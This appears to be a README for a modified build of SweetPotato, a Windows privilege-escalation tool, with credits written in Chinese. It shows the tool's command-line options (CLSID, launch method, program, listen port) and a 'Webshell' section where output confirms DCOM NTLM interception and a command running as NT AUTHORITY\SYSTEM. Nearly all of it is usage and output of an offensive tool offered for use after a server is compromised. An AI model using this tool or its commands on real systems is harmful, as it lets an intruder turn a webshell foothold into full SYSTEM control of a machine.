# SweetPotato

感谢@zcgonvh和@RcoIl两位师傅的耐心指导


![](https://s1.ax1x.com/2020/04/17/JVQeRs.png)


## Usage:

```
C:\Users\Administrator\Desktop\exe>SweetPotato.exe -h
Modify by Zero Team Uknow
SweetPotato by @_EthicalChaos_

  -c, --clsid=VALUE          CLSID (default BITS: 4991D34B-80A1-4291-83B6-
                               3328366B9097)
  -m, --method=VALUE         Auto,User,Thread (default Auto)
  -p, --prog=VALUE           Program to launch (default cmd.exe)
  -a, --args=VALUE           Arguments for program (default null)
  -l, --listenPort=VALUE     COM server listen port (default 6666)
  -h, --help                 Display this help

C:\Users\Administrator\Desktop\exe>
```

## Webshell


```
C:\Users\Administrator\Desktop\exe>SweetPotato.exe -a "whoami"
Modify by Zero Team Uknow
SweetPotato by @_EthicalChaos_

[+] Attempting DCOM NTLM interception with CLID 4991D34B-80A1-4291-83B6-3328366B9097 on port 6666 using method Token to launc
h c:\Windows\System32\cmd.exe
[+] Intercepted and authenticated successfully, launching program
[+] CreatePipe success
[+] Created launch thread using impersonated user NT AUTHORITY\SYSTEM
[+] Command : "c:\Windows\System32\cmd.exe" /c whoami
[+] process with pid: 5688 created.

=====================================

nt authority\system

[+] Process created, enjoy!

C:\Users\Administrator\Desktop\exe>
```
